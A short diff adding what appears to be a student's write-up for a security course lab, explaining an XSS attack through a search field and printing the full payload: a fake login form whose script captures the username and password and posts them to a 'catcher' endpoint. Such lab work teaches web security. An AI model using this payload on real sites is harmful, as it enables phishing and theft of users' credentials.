@@ -1,0 +1,14 @@
+Part 1 used a XSS attack that inputs a form and javascript code into the search field. And the search field interpretes the input as actual html code. The attack then constructed a fake login screen and submits recorded info to a designated web address
+<form id = "phishing_form">
+    <label for="ece568-2020f-user">User name:</label><br>
+    <input name="user" type="TEXT" id="ece568-2020f-user"><br>
+    <label for="ece568-2020f-pw">Password:</label><br>
+    <input name="passwd" type="password" id="ece568-2020f-pw"><br>
+    <input type="submit" id="ece568-2020f-submit" value="Submit" onclick="phish()">
+</form>
+<script>
+  function phish() {
+    alert("username=" + document.getElementById("ece568-2020f-user").value + " password=" + document.getElementById("ece568-2020f-pw").value);
+    $.post("catcher?PROPERTY=yes&phish-username=" + document.getElementById("ece568-2020f-user").value + "&phish-password=" + document.getElementById("ece568-2020f-pw").value);
+  }
+</script>
